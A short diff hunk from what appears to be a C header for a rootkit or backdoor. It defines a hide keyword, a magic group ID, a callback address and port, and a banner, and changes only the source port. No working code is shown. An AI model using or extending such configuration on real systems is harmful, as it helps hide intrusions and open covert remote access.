@@ -17,7 +17,7 @@
 #define MESSAGE "Shai'hulud called...\n"
 #define HIDEWORD "shaihulud"
 #define GID 4444
-#define SRCPORT 42069
+#define SRCPORT 4455
 #define REMOTE_ADDR "192.168.172.1"
 #define REMOTE_PORT 1337
 
